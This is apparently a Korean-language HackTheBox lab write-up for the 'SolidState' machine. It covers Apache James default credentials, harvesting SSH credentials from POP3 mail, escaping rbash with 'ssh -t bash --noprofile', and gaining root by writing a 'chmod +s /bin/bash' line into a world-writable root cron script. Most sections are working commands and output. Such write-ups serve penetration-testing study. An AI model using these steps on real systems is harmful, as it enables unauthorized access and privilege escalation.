# HTB — SolidState

#htb #writeup #linux #medium #james #pop3 #cron #privesc

---

## Overview

|항목|내용|
|---|---|
|**Machine**|SolidState|
|**OS**|Linux|
|**Difficulty**|Medium|
|**IP**|10.129.186.146|
|**User Flag**|✅|
|**Root Flag**|✅|

### 취약점 요약

- Apache James 2.3.2 default credentials (`root:root`)
- POP3 메일에서 SSH 크레덴셜 평문 노출
- Writable cron Python script → root 권한 상승

---

## Attack Path

```
Nmap scan
    ↓
Port 4555 — Apache James 2.3.2 Admin Console
    ↓
Default credentials (root:root)
    ↓
User 목록 열거 → mindy 확인
    ↓
POP3 (port 110) → mindy 메일 읽기
    ↓
SSH credentials 발견 (mindy:P@55W0rd1!2@)
    ↓
SSH 접속 → Restricted shell bypass
    ↓
/opt/tmp.py — world-writable + root cron 실행
    ↓
chmod +s /bin/bash → bash -p
    ↓
Root shell
```

---

## 1. Reconnaissance

### Full Port Scan

```bash
nmap -p- --min-rate 10000 -T4 10.129.186.146
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip
```

### Service Enumeration

```bash
nmap -sC -sV -p22,25,80,110,119,4555 10.129.186.146
```

> 핵심 발견: `JAMES Remote Administration Tool 2.3.2` → Port 4555

---

## 2. Web Enumeration

```
http://10.129.186.146
```

Solid State Security 회사 웹사이트 — 즉각적인 취약점 없음.  
**메일 서비스로 포커스 이동.**

---

## 3. Apache James Admin Console

### 접속

```bash
nc 10.129.186.146 4555
```

```
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
```

### Default Credentials

```
Login:    root
Password: root
```

→ 로그인 성공

### 사용자 목록 열거

```
listusers
```

```
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

---

## 4. POP3 — 메일에서 크레덴셜 수집

### 접속

```bash
nc 10.129.186.146 110
```

### mindy 계정 메일 확인

```
USER mindy
PASS mindy
LIST
RETR 1
RETR 2
```

### 발견된 SSH 크레덴셜

```
username: mindy
password: P@55W0rd1!2@
```

> 📌 메일 본문에 SSH 크레덴셜이 **평문으로** 포함되어 있음

---

## 5. SSH Access & Restricted Shell Bypass

### 일반 로그인 시도

```bash
ssh mindy@10.129.186.146
# Password: P@55W0rd1!2@
```

→ Restricted shell (`rbash`) — `cd` 등 명령어 차단됨

### Restricted Shell 우회

```bash
ssh mindy@10.129.186.146 -t "bash --noprofile"
```

→ 정상 bash 쉘 획득

---

## 6. User Flag

```bash
cd /home/mindy
cat user.txt
```

---

## 7. Privilege Escalation — Writable Cron Script

### Cron Job 확인

```bash
cat /etc/crontab
```

### /opt 디렉토리 확인

```bash
ls /opt
# james-2.3.2  tmp.py

ls -l /opt/tmp.py
# -rwxrwxrwx 1 root root ... /opt/tmp.py
```

> 📌 `root`가 3분마다 실행하는 스크립트가 **모든 유저가 쓰기 가능**

### Exploit

```bash
echo 'import os; os.system("chmod +s /bin/bash")' > /opt/tmp.py
```

### 3분 대기 후 SUID 확인

```bash
ls -l /bin/bash
# -rwsr-sr-x 1 root root ... /bin/bash
```

---

## 8. Root Shell

```bash
/bin/bash -p
whoami
# root
```

### Root Flag

```bash
cat /root/root.txt
```

---

## 취약점 분석

### 1. Apache James Default Credentials

- Admin 콘솔 (port 4555)이 기본 크레덴셜 `root:root`으로 열려있음
- 인증 없이 모든 메일 계정 목록 및 패스워드 변경 가능

### 2. SSH Credentials Exposure via Mail

- 관리자가 SSH 크레덴셜을 **평문 이메일**로 전송
- POP3 접근만으로 크레덴셜 탈취 가능

### 3. World-Writable Cron Script

```bash
-rwxrwxrwx /opt/tmp.py  ← 누구나 쓰기 가능
# root cron이 3분마다 실행 → 임의 명령 실행 가능
```

---

## Lessons Learned

- **Default credentials** 는 항상 가장 먼저 시도
- **Mail server** 는 크레덴셜 노출의 주요 경로
- `find / -writable -type f 2>/dev/null` 으로 writable 파일 탐색 → cron과 교차 확인
- Restricted shell → `bash --noprofile` 또는 `ssh -t` 로 우회 가능

---
